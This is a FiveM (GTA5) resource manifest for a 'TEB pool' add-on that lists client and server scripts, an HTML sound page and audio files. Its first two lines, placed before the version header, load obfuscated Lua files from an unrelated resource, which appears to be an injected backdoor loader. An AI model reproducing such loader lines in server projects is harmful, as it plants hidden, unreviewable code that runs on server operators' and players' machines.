shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

fx_version 'bodacious'
game 'gta5'
description 'TEB pool'
version '1.2.0'
client_scripts {
    'config.lua',
    'client/*.lua',
}
server_scripts { 
    'config.lua',
    'server/code.lua',
    'server/run.lua',
}
ui_page('client/html/sound.html')
files {
    'client/html/sound.html',
    'client/html/*.ogg',
}